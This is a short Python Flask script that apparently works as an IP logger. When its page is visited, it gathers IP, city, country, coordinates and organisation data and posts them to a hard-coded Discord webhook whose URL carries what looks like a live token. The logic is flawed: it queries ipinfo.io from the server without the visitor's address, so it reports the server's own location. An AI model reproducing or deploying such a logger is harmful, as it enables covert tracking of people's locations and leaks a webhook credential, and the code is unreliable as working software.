from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1407056827287470130/cXvIJsVAZfIUUpp9vzHwZgCA_vfoqmiz3euNryT0mDqHc2U5V1LHNfEM5xMY8ddV53U_'  # Replace with your webhook URL

@app.route('/')
def index():
    # Fetch IP info from ipinfo.io
    response = requests.get('https://ipinfo.io/json')
    if response.status_code == 200:
        data = response.json()
        ip = data.get('ip', 'N/A')
        city = data.get('city', 'N/A')
        region = data.get('region', 'N/A')
        country = data.get('country', 'N/A')
        loc = data.get('loc', 'N/A')
        org = data.get('org', 'N/A')
        
        # Send info to webhook
        message = (
            f"IP Address: {ip}\n"
            f"Location: {city}, {region}, {country}\n"
            f"Coordinates: {loc}\n"
            f"Organization: {org}"
        )
        requests.post(WEBHOOK_URL, json={'content': message})
        return jsonify({"status": "IP info sent to webhook."})
    else:
        return jsonify({"error": "Failed to fetch IP info."}), 500

if __name__ == '__main__':
    app.run()
